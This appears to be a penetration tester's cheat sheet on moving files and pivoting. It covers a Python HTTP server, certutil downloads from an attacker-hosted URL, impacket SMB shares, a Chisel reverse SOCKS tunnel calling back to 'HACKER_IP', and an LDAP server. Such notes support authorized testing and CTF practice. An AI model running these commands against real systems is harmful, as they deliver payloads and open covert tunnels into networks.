## Python:
```Shell
$ python3 -m http.server PORT
```

## Certutil
Windows
```powershell
PS > certutil -urlcache -f http://IP:PORT/file file_local
```
Could be used with [[Windows Privesc.#RunasCs.exe]] 
## SMB:
Server:
```Shell
sudo impacket-smbserver -smb2support SHARE_NAME RUN_DIR
sudo impacket-smbserver -smb2support share $(pwd)
```
Client:
```powershell
> New-PSDrive -Name "SHARE_NAME" -PsProvider "Filesystem" -Root "\\YOUR_IP\YOUR_SHARE_NAME"
```

## Chisel
Server (Linux):
```shell
$ chisel server --reverse --socks5 -p 8001
```
Client (Windows)
```powershell
> .\chisel.exe client HACKER_IP:PORT R:socks
```

Can be used with `curl`:
```shell
curl -x socks5://127.0.0.1:LPORT https://127.0.0.1:RPORT
```

## LDAP
Server:
```Shell
java -cp .:/opt/unboundid-ldapsdk-7.0.0/unboundid-ldapsdk.jar Server
```